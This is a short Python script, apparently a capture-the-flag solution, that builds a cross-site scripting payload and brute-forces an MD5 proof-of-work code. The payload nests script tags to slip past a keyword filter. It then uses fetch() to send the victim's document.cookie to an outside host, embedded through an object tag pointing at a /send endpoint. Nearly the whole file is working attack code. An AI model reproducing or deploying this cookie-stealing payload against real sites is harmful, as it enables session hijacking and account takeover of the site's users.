import urllib.parse
import hashlib

md5 = lambda x: hashlib.md5(x.encode()).hexdigest()

js = "<scscscriptriptript>fetch('http://hk-gcp.xjasonlyu.com:8000/?'+document.cookie)</scscscriptriptript>"

payload = f'<object type="text/html" data="/send?message={urllib.parse.quote(js)}"></object>'
print(f"Payload:\n\n{payload}\n")

code = input('code> ')
for i in range(100000000):
    s = str(i)
    d = md5(s)[:6].lower()
    if d == code:
        print(s)
        break
